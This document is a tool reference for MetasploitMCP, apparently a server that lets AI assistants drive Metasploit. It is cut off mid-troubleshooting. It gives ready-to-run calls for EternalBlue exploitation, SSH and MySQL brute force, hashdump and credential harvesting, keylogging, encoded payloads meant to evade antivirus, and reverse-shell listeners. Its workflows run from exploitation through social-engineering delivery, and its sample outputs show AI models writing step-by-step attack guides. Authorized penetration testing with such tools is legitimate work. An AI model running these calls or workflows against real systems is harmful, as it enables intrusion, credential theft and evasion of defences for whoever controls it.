# 🛠️ MetasploitMCP Tools Reference

Complete guide to all available MCP tools and their capabilities.

---

## 📋 Table of Contents

1. [Overview](#overview)
2. [Module Discovery Tools](#module-discovery-tools)
3. [Exploitation Tools](#exploitation-tools)
4. [Payload Generation](#payload-generation)
5. [Session Management](#session-management)
6. [Handler Management](#handler-management)
7. [AI-Powered Tools](#ai-powered-tools)
8. [Complete Usage Examples](#complete-usage-examples)
9. [Best Practices](#best-practices)
10. [Troubleshooting](#troubleshooting)

---

## Overview

MetasploitMCP provides **13 powerful tools** that bridge AI assistants with Metasploit Framework capabilities. All tools are accessible through natural language when using an MCP-compatible AI assistant.

### Quick Stats
- **Total Tools**: 13
- **Available Exploits**: 2,565
- **Available Payloads**: 1,675
- **API Version**: 1.0
- **Metasploit Version**: 6.4.95-dev

### Tool Categories
- 🔍 **Discovery** (2 tools): Find exploits and payloads
- 💥 **Exploitation** (3 tools): Run exploits and modules
- 🎯 **Payloads** (1 tool): Generate payload files
- 🖥️ **Sessions** (3 tools): Manage active sessions
- 🔊 **Handlers** (3 tools): Manage listeners and jobs
- 🤖 **AI Analysis** (3 tools): AI-powered insights

---

## Module Discovery Tools

### 1. list_exploits

**Purpose**: Search and list available Metasploit exploit modules.

**Parameters**:
- `search_term` (optional, string): Filter exploits by keyword (case-insensitive)

**Returns**:
- List of exploit module names (max 200 with search term, 100 without)

**Example Usage**:

```python
# Natural language with AI
"Show me all Windows SMB exploits"
"List exploits for EternalBlue"
"Find exploits related to Apache"

# Direct tool call
list_exploits("windows smb")
list_exploits("ms17_010")
list_exploits("")  # Returns first 100 exploits
```

**Sample Output**:
```json
[
  "windows/smb/ms17_010_eternalblue",
  "windows/smb/ms08_067_netapi",
  "windows/smb/ms06_040_netapi",
  "unix/ftp/vsftpd_234_backdoor",
  "linux/samba/is_known_pipename"
]
```

**Use Cases**:
- Reconnaissance: Finding applicable exploits for discovered vulnerabilities
- Research: Exploring available exploits for a specific service
- Validation: Checking if a specific exploit exists in Metasploit

**Tips**:
- Use specific keywords to narrow results (e.g., "ssh", "ftp", "windows")
- Search by CVE number works well (e.g., "ms17_010")
- Combine with platform and service names for best results

---

### 2. list_payloads

**Purpose**: Search and list available Metasploit payload modules with optional filtering.

**Parameters**:
- `platform` (optional, string): Filter by platform (e.g., "windows", "linux", "python", "php")
- `arch` (optional, string): Filter by architecture (e.g., "x86", "x64", "cmd", "meterpreter")

**Returns**:
- List of payload names (max 100)

**Example Usage**:

```python
# Natural language with AI
"What payloads work on Windows x64?"
"Show me Linux meterpreter payloads"
"List all Python reverse shells"

# Direct tool call
list_payloads(platform="windows", arch="x64")
list_payloads(platform="linux", arch="meterpreter")
list_payloads(platform="php")
```

**Sample Output**:
```json
[
  "windows/x64/meterpreter/reverse_tcp",
  "windows/x64/meterpreter/reverse_https",
  "windows/x64/shell/reverse_tcp",
  "linux/x86/meterpreter/reverse_tcp",
  "python/meterpreter/reverse_tcp"
]
```

**Platform Options**:
- `windows` - Windows payloads
- `linux` - Linux payloads
- `osx` - macOS payloads
- `android` - Android payloads
- `python` - Python-based payloads
- `php` - PHP-based payloads
- `java` - Java-based payloads

**Architecture Options**:
- `x86` - 32-bit
- `x64` - 64-bit
- `meterpreter` - Meterpreter payloads
- `cmd` - Command-line payloads
- `shell` - Shell payloads

**Use Cases**:
- Selecting compatible payloads for target architecture
- Finding stealthy payload options
- Cross-platform payload research

---

## Exploitation Tools

### 3. run_exploit

**Purpose**: Execute a Metasploit exploit module against a target system.

**Parameters**:
- `module_name` (required, string): Name/path of exploit (e.g., "exploit/windows/smb/ms17_010_eternalblue")
- `options` (required, dict): Exploit module options (e.g., `{"RHOSTS": "192.168.1.100"}`)
- `payload_name` (optional, string): Payload to use (e.g., "windows/x64/meterpreter/reverse_tcp")
- `payload_options` (optional, dict): Payload options (e.g., `{"LHOST": "192.168.1.10", "LPORT": 4444}`)
- `run_as_job` (optional, bool): Run asynchronously (default: false)
- `check_vulnerability` (optional, bool): Run vulnerability check first (default: false)
- `timeout_seconds` (optional, int): Timeout for synchronous execution (default: 60)

**Returns**:
- Dictionary with status, message, job_id, session_id, and module details

**Example Usage**:

```python
# Natural language with AI
"Exploit 192.168.1.100 using EternalBlue"
"Run ms17_010 against 10.0.0.5 with reverse TCP to my IP"
"Check if target is vulnerable before exploiting"

# Direct tool call
run_exploit(
    module_name="exploit/windows/smb/ms17_010_eternalblue",
    options={"RHOSTS": "192.168.1.100"},
    payload_name="windows/x64/meterpreter/reverse_tcp",
    payload_options={"LHOST": "192.168.1.10", "LPORT": 4444},
    check_vulnerability=True
)
```

**Sample Output**:
```json
{
  "status": "success",
  "message": "Exploit module exploit/windows/smb/ms17_010_eternalblue completed via console (exploit). Session 1 detected.",
  "session_id_detected": 1,
  "module": "exploit/windows/smb/ms17_010_eternalblue",
  "options": {"RHOSTS": "192.168.1.100"},
  "payload_name": "windows/x64/meterpreter/reverse_tcp",
  "payload_options": {"LHOST": "192.168.1.10", "LPORT": 4444}
}
```

**Key Options**:
- `RHOSTS` - Target IP address(es)
- `RPORT` - Target port
- `LHOST` - Your listening IP (for reverse connections)
- `LPORT` - Your listening port
- `SSL` - Use SSL/TLS (boolean)
- `TARGET` - Specific target type (if applicable)

**Execution Modes**:
- **Synchronous** (`run_as_job=False`): Waits for completion, returns output
- **Asynchronous** (`run_as_job=True`): Returns job ID immediately, polls for session

**Use Cases**:
- Gaining initial access to target systems
- Testing vulnerability patches
- Demonstrating security weaknesses
- Penetration testing engagements

**Safety Features**:
- `check_vulnerability=True` runs a check before exploitation
- Aborts if target appears not vulnerable
- Timeout protection prevents hanging

---

### 4. run_auxiliary_module

**Purpose**: Run Metasploit auxiliary modules (scanners, fuzzers, etc.).

**Parameters**:
- `module_name` (required, string): Name/path of auxiliary module
- `options` (required, dict): Module options
- `run_as_job` (optional, bool): Run asynchronously (default: false)
- `check_target` (optional, bool): Run check action first (default: false)
- `timeout_seconds` (optional, int): Timeout for synchronous execution (default: 60)

**Returns**:
- Dictionary with status, message, and module output

**Example Usage**:

```python
# Natural language with AI
"Scan 192.168.1.0/24 for SMB vulnerabilities"
"Check if SSH is running on 10.0.0.5"
"Enumerate users on the domain controller"

# Direct tool call
run_auxiliary_module(
    module_name="scanner/smb/smb_version",
    options={"RHOSTS": "192.168.1.0/24", "THREADS": 10}
)

run_auxiliary_module(
    module_name="scanner/ssh/ssh_login",
    options={
        "RHOSTS": "192.168.1.100",
        "USERNAME": "admin",
        "PASSWORD": "password123"
    }
)
```

**Sample Output**:
```json
{
  "status": "success",
  "message": "Auxiliary module scanner/smb/smb_version completed via console (run).",
  "module_output": "[*] 192.168.1.100:445 - Host is running Windows Server 2016\n[*] 192.168.1.101:445 - Host is running Windows 10\n[*] Scanned 2 of 2 hosts (100% complete)"
}
```

**Common Auxiliary Modules**:

| Module | Purpose |
|--------|---------|
| `scanner/smb/smb_version` | Detect SMB version |
| `scanner/ssh/ssh_login` | SSH brute force |
| `scanner/http/http_version` | HTTP server detection |
| `scanner/portscan/tcp` | TCP port scanning |
| `scanner/ftp/ftp_login` | FTP authentication testing |
| `scanner/mysql/mysql_login` | MySQL brute force |
| `scanner/smb/smb_enumusers` | SMB user enumeration |

**Use Cases**:
- Network reconnaissance
- Service fingerprinting
- Authentication testing
- Vulnerability scanning
- Information gathering

---

### 5. run_post_module

**Purpose**: Execute post-exploitation modules against an existing session.

**Parameters**:
- `module_name` (required, string): Name/path of post module
- `session_id` (required, int): Target session ID
- `options` (optional, dict): Additional module options (SESSION is auto-added)
- `run_as_job` (optional, bool): Run asynchronously (default: false)
- `timeout_seconds` (optional, int): Timeout for synchronous execution (default: 60)

**Returns**:
- Dictionary with status, message, and module output

**Example Usage**:

```python
# Natural language with AI
"Dump password hashes from session 1"
"Enumerate installed applications on session 2"
"Check what privileges I have on session 1"

# Direct tool call
run_post_module(
    module_name="windows/gather/hashdump",
    session_id=1
)

run_post_module(
    module_name="windows/gather/enum_applications",
    session_id=1
)
```

**Sample Output**:
```json
{
  "status": "success",
  "message": "Post module windows/gather/hashdump completed via console (run).",
  "module_output": "[*] Obtaining the boot key...\n[*] Calculating the hboot key using SYSKEY...\n[+] Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::"
}
```

**Popular Post Modules**:

| Module | Purpose |
|--------|---------|
| `windows/gather/hashdump` | Extract password hashes |
| `windows/gather/enum_applications` | List installed software |
| `windows/gather/credentials/credential_collector` | Collect credentials |
| `linux/gather/enum_system` | System information |
| `multi/gather/env` | Environment variables |
| `multi/recon/local_exploit_suggester` | Find privilege escalation exploits |
| `windows/manage/enable_rdp` | Enable Remote Desktop |

**Use Cases**:
- Privilege escalation preparation
- Credential harvesting
- System enumeration
- Lateral movement setup
- Data exfiltration

**Prerequisites**:
- Active session must exist
- Session type must be compatible with module
- Sufficient privileges on target system

---

## Payload Generation

### 6. generate_payload

**Purpose**: Generate executable payload files using Metasploit's payload generator.

**Parameters**:
- `payload_type` (required, string): Payload type (e.g., "windows/meterpreter/reverse_tcp")
- `format_type` (required, string): Output format ("exe", "elf", "python", "raw", etc.)
- `options` (required, dict): Payload options (LHOST, LPORT, etc.)
- `encoder` (optional, string): Encoder to use for evasion
- `iterations` (optional, int): Encoding iterations (default: 0)
- `bad_chars` (optional, string): Bad characters to avoid (e.g., "\x00\x0a\x0d")
- `nop_sled_size` (optional, int): NOP sled size (default: 0)
- `template_path` (optional, string): Path to executable template
- `keep_template` (optional, bool): Keep template working (default: false)
- `force_encode` (optional, bool): Force encoding (default: false)
- `output_filename` (optional, string): Desired filename

**Returns**:
- Dictionary with status, payload size, format, and save path

**Example Usage**:

```python
# Natural language with AI
"Generate a Windows reverse shell exe that connects to my IP on port 4444"
"Create a Linux meterpreter payload for 192.168.1.10:8080"
"Generate a Python payload with shikata encoding"

# Direct tool call
generate_payload(
    payload_type="windows/meterpreter/reverse_tcp",
    format_type="exe",
    options={"LHOST": "192.168.1.10", "LPORT": 4444}
)

generate_payload(
    payload_type="linux/x86/meterpreter/reverse_tcp",
    format_type="elf",
    options={"LHOST": "192.168.1.10", "LPORT": 4444},
    encoder="x86/shikata_ga_nai",
    iterations=5
)
```

**Sample Output**:
```json
{
  "status": "success",
  "message": "Payload 'windows/meterpreter/reverse_tcp' generated successfully and saved.",
  "payload_size": 73802,
  "format": "exe",
  "server_save_path": "/home/user/payloads/payload_windows_meterpreter_reverse_tcp_20251018_135045.exe"
}
```

**Supported Formats**:
- `exe` - Windows executable
- `elf` - Linux executable
- `macho` - macOS executable
- `dll` - Windows DLL
- `vbs` - VBScript
- `python` - Python script
- `ruby` - Ruby script
- `powershell` - PowerShell script
- `raw` - Raw shellcode
- `c` - C language array
- `war` - Java WAR file
- `jar` - Java JAR file

**Common Encoders**:
- `x86/shikata_ga_nai` - Polymorphic XOR encoder
- `x64/xor_dynamic` - 64-bit XOR encoder
- `cmd/powershell_base64` - PowerShell base64 encoder
- `generic/none` - No encoding

**Use Cases**:
- Creating payloads for social engineering
- Generating shellcode for exploit development
- Testing antivirus evasion
- Preparing payloads for physical access scenarios

**Save Location**:
- Default: `~/payloads/` or `$PAYLOAD_SAVE_DIR`
- Configurable via environment variable
- Automatic timestamp in filename

**Security Considerations**:
- Generated payloads will trigger antivirus
- Use encoding/obfuscation for evasion
- Only use in authorized testing
- Handle files securely

---

## Session Management

### 7. list_active_sessions

**Purpose**: Display all currently active Metasploit sessions with detailed information.

**Parameters**: None

**Returns**:
- Dictionary with status, sessions dict, and count

**Example Usage**:

```python
# Natural language with AI
"What sessions are active?"
"Show me all open sessions"
"List current connections"

# Direct tool call
list_active_sessions()
```

**Sample Output**:
```json
{
  "status": "success",
  "count": 2,
  "sessions": {
    "1": {
      "type": "meterpreter",
      "tunnel_local": "192.168.1.10:4444",
      "tunnel_peer": "192.168.1.100:49152",
      "via_exploit": "exploit/windows/smb/ms17_010_eternalblue",
      "via_payload": "windows/x64/meterpreter/reverse_tcp",
      "desc": "Meterpreter",
      "info": "NT AUTHORITY\\SYSTEM @ WINSERVER2016",
      "workspace": "default",
      "session_host": "192.168.1.100",
      "session_port": 49152,
      "target_host": "192.168.1.100",
      "username": "NT AUTHORITY\\SYSTEM",
      "uuid": "12345678-abcd-1234-abcd-1234567890ab",
      "exploit_uuid": "abcd1234-1234-abcd-1234-abcd12345678",
      "routes": "",
      "arch": "x86_64"
    },
    "2": {
      "type": "shell",
      "tunnel_local": "192.168.1.10:5555",
      "tunnel_peer": "192.168.1.101:36789",
      "via_exploit": "unix/ftp/vsftpd_234_backdoor",
      "desc": "Command shell",
      "info": "uid=0(root) gid=0(root)",
      "session_host": "192.168.1.101"
    }
  }
}
```

**Session Information Fields**:
- `type` - Session type (meterpreter, shell, etc.)
- `info` - User context and system info
- `via_exploit` - Exploit used to create session
- `via_payload` - Payload used
- `tunnel_local` - Local connection endpoint
- `tunnel_peer` - Remote connection endpoint
- `uuid` - Unique session identifier
- `arch` - Target architecture

**Use Cases**:
- Session inventory and tracking
- Identifying available access points
- Planning lateral movement
- Session type verification for post modules

---

### 8. send_session_command

**Purpose**: Execute commands in an active Metasploit session (Meterpreter or Shell).

**Parameters**:
- `session_id` (required, int): Target session ID
- `command` (required, string): Command to execute
- `timeout_seconds` (optional, int): Command timeout (default: 60)

**Returns**:
- Dictionary with status, message, and command output

**Example Usage**:

```python
# Natural language with AI
"Run 'whoami' in session 1"
"Execute 'sysinfo' on session 2"
"Get the current directory in session 1"

# Direct tool call - Meterpreter
send_session_command(session_id=1, command="sysinfo")
send_session_command(session_id=1, command="getuid")
send_session_command(session_id=1, command="pwd")

# Direct tool call - Shell
send_session_command(session_id=2, command="whoami")
send_session_command(session_id=2, command="uname -a")
send_session_command(session_id=2, command="ls -la /home")
```

**Sample Output**:
```json
{
  "status": "success",
  "message": "Meterpreter command executed successfully.",
  "output": "Computer        : WINSERVER2016\nOS              : Windows 2016 (10.0 Build 14393).\nArchitecture    : x64\nSystem Language : en_US\nDomain          : WORKGROUP\nLogged On Users : 2\nMeterpreter     : x64/windows"
}
```

**Meterpreter-Specific Commands**:
- `sysinfo` - System information
- `getuid` - Get current user
- `pwd` / `getwd` - Current directory
- `ls` - List files
- `cat <file>` - Read file
- `download <file>` - Download file
- `upload <local> <remote>` - Upload file
- `shell` - Drop to system shell
- `migrate <pid>` - Migrate to process
- `hashdump` - Dump password hashes
- `screenshot` - Take screenshot
- `keyscan_start` - Start keylogger
- `ps` - List processes

**Shell Commands**:
- Standard OS commands (bash, cmd, etc.)
- `whoami` - Current user
- `hostname` - System name
- `ifconfig` / `ipconfig` - Network config
- `cat /etc/passwd` - User accounts (Linux)
- `net user` - User accounts (Windows)

**Special Modes**:
- **Meterpreter → Shell**: Use `shell` command to enter interactive shell
- **Shell → Meterpreter**: Use `exit` to return to Meterpreter prompt
- Session state is tracked automatically

**Use Cases**:
- Post-exploitation reconnaissance
- File system navigation
- Privilege checking
- Data exfiltration
- System manipulation

**Tips**:
- For Meterpreter, use built-in commands for better stability
- Shell sessions may have limited output formatting
- Long-running commands may timeout
- Use background jobs for persistent tasks

---

### 9. terminate_session

**Purpose**: Forcefully close and terminate an active Metasploit session.

**Parameters**:
- `session_id` (required, int): ID of session to terminate

**Returns**:
- Dictionary with status and confirmation message

**Example Usage**:

```python
# Natural language with AI
"Close session 1"
"Terminate session 2"
"Kill all sessions"  # (Would call this multiple times)

# Direct tool call
terminate_session(session_id=1)
```

**Sample Output**:
```json
{
  "status": "success",
  "message": "Session 1 terminated successfully."
}
```

**Use Cases**:
- Cleaning up after testing
- Removing unstable sessions
- Stealth considerations (reducing footprint)
- Resource management

**Important Notes**:
- Session termination is immediate
- No undo option
- Terminates all session activities
- May leave artifacts on target
- Use `exit` command gracefully when possible

---

## Handler Management

### 10. list_listeners

**Purpose**: Display all active Metasploit jobs and handlers (multi/handler).

**Parameters**: None

**Returns**:
- Dictionary with handlers, other jobs, and counts

**Example Usage**:

```python
# Natural language with AI
"What listeners are running?"
"Show active handlers"
"List all background jobs"

# Direct tool call
list_listeners()
```

**Sample Output**:
```json
{
  "status": "success",
  "handlers": {
    "1": {
      "job_id": "1",
      "name": "Exploit: multi/handler",
      "datastore": {
        "PAYLOAD": "windows/meterpreter/reverse_tcp",
        "LHOST": "192.168.1.10",
        "LPORT": 4444,
        "ExitOnSession": false
      }
    }
  },
  "other_jobs": {
    "2": {
      "job_id": "2",
      "name": "Auxiliary: scanner/smb/smb_version"
    }
  },
  "handler_count": 1,
  "other_job_count": 1,
  "total_job_count": 2
}
```

**Handler Information**:
- `job_id` - Unique job identifier
- `name` - Job description
- `datastore` - Configuration parameters
- `PAYLOAD` - Handler payload type
- `LHOST` - Listening IP address
- `LPORT` - Listening port
- `ExitOnSession` - Handler behavior

**Use Cases**:
- Monitoring active listeners
- Verifying handler configuration
- Tracking background jobs
- Managing multiple handlers
- Troubleshooting connection issues

---

### 11. start_listener

**Purpose**: Create and start a new multi/handler to receive incoming connections.

**Parameters**:
- `payload_type` (required, string): Payload to handle (e.g., "windows/meterpreter/reverse_tcp")
- `lhost` (required, string): Listening IP address
- `lport` (required, int): Listening port (1-65535)
- `additional_options` (optional, dict): Extra payload options
- `exit_on_session` (optional, bool): Exit handler after first session (default: false)

**Returns**:
- Dictionary with status, message, job_id, and handler details

**Example Usage**:

```python
# Natural language with AI
"Start a reverse TCP handler on port 4444"
"Listen for Windows Meterpreter on port 8080"
"Create a handler for Linux shells on my IP port 5555"

# Direct tool call
start_listener(
    payload_type="windows/meterpreter/reverse_tcp",
    lhost="192.168.1.10",
    lport=4444
)

start_listener(
    payload_type="linux/x86/shell/reverse_tcp",
    lhost="0.0.0.0",
    lport=5555,
    exit_on_session=False
)
```

**Sample Output**:
```json
{
  "status": "success",
  "message": "Listener for windows/meterpreter/reverse_tcp started as job 1 on 192.168.1.10:4444.",
  "job_id": 1,
  "payload_name": "windows/meterpreter/reverse_tcp",
  "payload_options": {
    "LHOST": "192.168.1.10",
    "LPORT": 4444
  }
}
```

**Common Payload Types**:
- `windows/meterpreter/reverse_tcp` - Windows Meterpreter
- `windows/shell/reverse_tcp` - Windows CMD shell
- `linux/x86/meterpreter/reverse_tcp` - Linux Meterpreter
- `linux/x86/shell/reverse_tcp` - Linux bash shell
- `python/meterpreter/reverse_tcp` - Python Meterpreter
- `php/meterpreter/reverse_tcp` - PHP Meterpreter

**Handler Behavior**:
- `exit_on_session=false`: Handler stays active for multiple connections
- `exit_on_session=true`: Handler closes after first session

**Use Cases**:
- Preparing to receive reverse shells
- Setting up before exploit execution
- Handling multiple payloads
- Creating persistent listeners
- Social engineering campaigns

**Best Practices**:
- Start handler before executing payload
- Use non-standard ports to avoid detection
- Set `exit_on_session=false` for multiple connections
- Verify handler is running before exploitation

---

### 12. stop_job

**Purpose**: Stop a running Metasploit job or handler.

**Parameters**:
- `job_id` (required, int): ID of job to stop

**Returns**:
- Dictionary with status, message, and job details

**Example Usage**:

```python
# Natural language with AI
"Stop job 1"
"Kill handler 2"
"Stop the listener on port 4444"  # (after checking job ID)

# Direct tool call
stop_job(job_id=1)
```

**Sample Output**:
```json
{
  "status": "success",
  "message": "Successfully stopped job 1 ('Exploit: multi/handler')",
  "job_id": 1,
  "job_name": "Exploit: multi/handler"
}
```

**Use Cases**:
- Cleaning up unused handlers
- Stopping long-running scans
- Resource management
- Port deconfliction
- Testing cleanup

**Verification**:
- Tool verifies job disappears from job list
- Returns error if job still running
- Graceful shutdown attempted first

---

## AI-Powered Tools

### 13. analyze_exploit_with_ai

**Purpose**: Use AI to analyze a Metasploit exploit and provide detailed technical insights.

**Parameters**:
- `exploit_name` (required, string): Name/path of exploit module
- `target_info` (optional, string): Information about target system

**Returns**:
- Dictionary with AI analysis, exploit details, and recommendations

**Example Usage**:

```python
# Natural language with AI
"Analyze the EternalBlue exploit"
"Tell me about ms17_010"
"What are the risks of using the vsftpd backdoor exploit?"

# Direct tool call
analyze_exploit_with_ai(
    exploit_name="exploit/windows/smb/ms17_010_eternalblue",
    target_info="Windows Server 2016, fully patched as of 2017"
)
```

**Sample Output**:
```json
{
  "status": "success",
  "exploit_name": "exploit/windows/smb/ms17_010_eternalblue",
  "target_info": "Windows Server 2016, fully patched as of 2017",
  "ai_analysis": "## Technical Analysis\n\nMS17-010 (EternalBlue) is a critical remote code execution vulnerability...\n\n## Potential Impact\n- Complete system compromise\n- Network propagation capability\n- Wormable vulnerability\n\n## Prerequisites\n- SMBv1 enabled\n- Port 445 accessible\n- Unpatched system\n\n## Recommendations\n- Apply MS17-010 security update\n- Disable SMBv1\n- Network segmentation\n\n## Safe Usage\n- Only in authorized testing\n- Verify patch status first\n- Use check module before exploitation",
  "model_used": "x-ai/grok-4-fast:free"
}
```

**Analysis Includes**:
1. **Technical details**: How the exploit works
2. **Impact assessment**: Potential damage and risks
3. **Prerequisites**: Requirements for successful exploitation
4. **Recommendations**: Safe usage guidelines
5. **Alternatives**: Other exploitation approaches
6. **Limitations**: Known issues or caveats

**Use Cases**:
- Understanding exploit mechanisms
- Risk assessment before exploitation
- Educational purposes
- Report documentation
- Decision making for exploit selection

**Requires**: OpenRouter API key configured

---

### 14. generate_metasploit_commands_with_ai

**Purpose**: Convert natural language descriptions into step-by-step Metasploit commands.

**Parameters**:
- `description` (required, string): Natural language description of task
- `target_os` (optional, string): Target operating system
- `target_service` (optional, string): Target service or application

**Returns**:
- Dictionary with AI-generated command guide

**Example Usage**:

```python
# Natural language with AI
"How do I exploit a vulnerable FTP server?"
"Show me how to scan for SMB vulnerabilities and exploit them"
"What's the process for getting a shell on a Linux web server?"

# Direct tool call
generate_metasploit_commands_with_ai(
    description="Exploit an unpatched Windows 7 machine via SMB",
    target_os="Windows 7",
    target_service="SMB"
)
```

**Sample Output**:
```json
{
  "status": "success",
  "description": "Exploit an unpatched Windows 7 machine via SMB",
  "target_os": "Windows 7",
  "target_service": "SMB",
  "ai_generated_guide": "## Step-by-Step Metasploit Commands\n\n### 1. Start a Handler\n```\nstart_listener(\n  payload_type='windows/meterpreter/reverse_tcp',\n  lhost='<YOUR_IP>',\n  lport=4444\n)\n```\n\n### 2. Run the Exploit\n```\nrun_exploit(\n  module_name='exploit/windows/smb/ms08_067_netapi',\n  options={'RHOSTS': '<TARGET_IP>'},\n  payload_name='windows/meterpreter/reverse_tcp',\n  payload_options={'LHOST': '<YOUR_IP>', 'LPORT': 4444}\n)\n```\n\n### 3. Verify Session\n```\nlist_active_sessions()\n```\n\n### 4. Interact with Session\n```\nsend_session_command(session_id=1, command='sysinfo')\n```\n\n## Safety Considerations\n- Only use on authorized systems\n- Verify target is Windows 7\n- Check patch level first\n- Have written permission",
  "model_used": "x-ai/grok-4-fast:free"
}
```

**Guide Includes**:
- Numbered step-by-step instructions
- Actual tool calls with parameters
- Explanations for each step
- Safety considerations
- Prerequisites
- Alternative approaches

**Use Cases**:
- Learning Metasploit workflows
- Quick reference for complex tasks
- Automation planning
- Training and education
- Procedural documentation

**Requires**: OpenRouter API key configured

---

### 15. analyze_vulnerability_with_ai

**Purpose**: Analyze vulnerability descriptions and suggest Metasploit exploitation approaches.

**Parameters**:
- `vulnerability_description` (required, string): Description of vulnerability or CVE
- `affected_system` (optional, string): Information about affected system

**Returns**:
- Dictionary with AI analysis and exploitation suggestions

**Example Usage**:

```python
# Natural language with AI
"Analyze CVE-2023-1234"
"How can I exploit an SQL injection vulnerability?"
"What Metasploit modules work for heap overflow in Apache?"

# Direct tool call
analyze_vulnerability_with_ai(
    vulnerability_description="Remote code execution via buffer overflow in FTP service",
    affected_system="Linux Ubuntu 20.04 running vsftpd 2.3.4"
)
```

**Sample Output**:
```json
{
  "status": "success",
  "vulnerability_description": "Remote code execution via buffer overflow in FTP service",
  "affected_system": "Linux Ubuntu 20.04 running vsftpd 2.3.4",
  "ai_analysis_and_suggestions": "## Vulnerability Analysis\n\n### Type: Remote Code Execution\nThis appears to be the famous vsftpd 2.3.4 backdoor vulnerability.\n\n### Relevant Metasploit Modules\n\n1. **exploit/unix/ftp/vsftpd_234_backdoor**\n   - Most direct approach\n   - No authentication required\n   - Creates command shell\n\n### Configuration Example\n```python\nrun_exploit(\n  module_name='exploit/unix/ftp/vsftpd_234_backdoor',\n  options={'RHOSTS': '<target_ip>'},\n  payload_name='cmd/unix/interact'\n)\n```\n\n### Prerequisites\n- FTP port (21) accessible\n- Service running vsftpd 2.3.4\n- Backdoor not removed\n\n### Risk Assessment\n- **Severity**: Critical\n- **Exploitability**: High\n- **Detection**: Medium\n\n### Recommendations\n- Check vulnerability with scanner first\n- Upgrade to vsftpd 3.x\n- Disable FTP if not needed\n- Use SFTP instead",
  "model_used": "x-ai/grok-4-fast:free"
}
```

**Analysis Includes**:
- Vulnerability type classification
- Relevant Metasploit modules
- Configuration examples
- Prerequisites and requirements
- Risk assessment
- Mitigation recommendations
- Alternative methods

**Use Cases**:
- Vulnerability research
- Exploit module discovery
- Risk assessment
- Penetration testing planning
- Security advisory analysis

**Requires**: OpenRouter API key configured

---

## Complete Usage Examples

### Example 1: Full Exploitation Workflow

```python
# 1. Search for exploits
"Find exploits for Windows SMB"
# Returns: List including ms17_010_eternalblue

# 2. Analyze exploit with AI
"Analyze the ms17_010 exploit"
# Returns: Technical analysis and recommendations

# 3. Start a listener
"Start a reverse TCP handler on port 4444"
# Returns: Handler started as job 1

# 4. Check vulnerability (optional)
"Run ms17_010 against 192.168.1.100 with check"
# Returns: Target appears vulnerable

# 5. Run the exploit
"Exploit 192.168.1.100 using ms17_010 with reverse TCP to 192.168.1.10:4444"
# Returns: Session 1 created

# 6. Verify session
"What sessions are active?"
# Returns: Session 1 (meterpreter)

# 7. Interact with session
"Run sysinfo in session 1"
# Returns: System information

# 8. Post-exploitation
"Dump password hashes from session 1"
# Returns: NTLM hashes

# 9. Cleanup
"Close session 1"
"Stop job 1"
```

### Example 2: Reconnaissance Workflow

```python
# 1. Port scanning
"Scan 192.168.1.0/24 for open SMB ports"
run_auxiliary_module(
    module_name="scanner/smb/smb_version",
    options={"RHOSTS": "192.168.1.0/24", "THREADS": 20}
)

# 2. Service identification
"Enumerate SMB shares on 192.168.1.100"
run_auxiliary_module(
    module_name="scanner/smb/smb_enumshares",
    options={"RHOSTS": "192.168.1.100"}
)

# 3. User enumeration
"List SMB users on 192.168.1.100"
run_auxiliary_module(
    module_name="scanner/smb/smb_enumusers",
    options={"RHOSTS": "192.168.1.100"}
)
```

### Example 3: Payload Generation and Delivery

```python
# 1. Generate payload
"Create a Windows reverse shell exe for 192.168.1.10:4444"
generate_payload(
    payload_type="windows/meterpreter/reverse_tcp",
    format_type="exe",
    options={"LHOST": "192.168.1.10", "LPORT": 4444},
    encoder="x86/shikata_ga_nai",
    iterations=3
)
# Returns: /home/user/payloads/payload_windows_meterpreter_reverse_tcp_20251018.exe

# 2. Start handler FIRST
"Start a handler for Windows Meterpreter on port 4444"
start_listener(
    payload_type="windows/meterpreter/reverse_tcp",
    lhost="0.0.0.0",
    lport=4444
)

# 3. Deliver payload to target (out of scope for these tools)
# ... social engineering, web delivery, etc. ...

# 4. Wait for connection
"What sessions are active?"
# Returns: Session 1 when payload executes

# 5. Interact
"Run whoami in session 1"
```

### Example 4: AI-Assisted Analysis

```python
# 1. Learn about vulnerability
"Analyze CVE-2017-0144"
analyze_vulnerability_with_ai(
    vulnerability_description="CVE-2017-0144 SMBv1 RCE",
    affected_system="Windows 7/2008"
)

# 2. Get command guidance
"How do I exploit this?"
generate_metasploit_commands_with_ai(
    description="Exploit CVE-2017-0144 on Windows 7",
    target_os="Windows 7",
    target_service="SMB"
)

# 3. Follow the generated steps
# (AI returns step-by-step commands)
```

---

## Best Practices

### General Guidelines

1. **Always get authorization** before testing
2. **Document everything** for reports
3. **Use check modules** before exploitation
4. **Start handlers** before running exploits
5. **Clean up sessions** and jobs when done
6. **Monitor logs** for troubleshooting

### Security Considerations

1. **Network Isolation**
   - Test in isolated lab environment
   - Use VLANs or separate networks
   - Never test production systems without approval

2. **Credential Management**
   - Use strong passwords for msfrpcd
   - Enable SSL for RPC connections
   - Rotate credentials regularly

3. **Session Management**
   - Terminate sessions when complete
   - Don't leave sessions idle
   - Monitor for unexpected sessions

4. **Payload Handling**
   - Store payloads securely
   - Delete after use
   - Never share payloads publicly

### Operational Tips

1. **Before Exploitation**
   - Verify target information
   - Check service versions
   - Run vulnerability checks
   - Ensure handler is ready

2. **During Exploitation**
   - Monitor for success indicators
   - Watch for errors/failures
   - Be patient (some exploits are slow)
   - Have backup plans

3. **After Exploitation**
   - Document what worked
   - Save relevant output
   - Clean up artifacts
   - Update reports

### Error Handling

1. **Connection Failures**
   - Verify firewall rules
   - Check msfrpcd is running
   - Confirm credentials are correct
   - Test port accessibility

2. **Exploitation Failures**
   - Wrong target version
   - Patches installed
   - Incorrect options
   - Network issues

3. **Session Issues**
   - Session died/closed
   - Network interruption
   - Target was rebooted
   - Insufficient privileges

---

## Troubleshooting

### Common Issues

#### Issue: "Authentication failed"
**Cause**: Wrong password or SSL setting  
**Solution**:
```bash
# Check .env.local settings
grep MSF_ .env.local

# Verify SSL setting matches msfrpcd
# msfrpcd runs with SSL by default
MSF_SSL=true
```

#### Issue: "Connection timeout"
**Cause**: msfrpcd not running or firewall blocking  
**Solution**:
```bash
# Check msfrpcd status
ssh metasploit-mcp "pgrep -f msfrpcd"

# Check firewall
ssh metasploit-mcp "sudo ufw status | grep 55553"

# Test connectivity
timeout 5 bash -c 'cat < /dev/null > /dev/tcp/168.110.55.210/55553'
```

#### Issue: "Module not found"
**Cause**: Wrong module name or path  
**Solution**:
```python
# Search for correct name
list_exploits("partial_name")

# Use full path
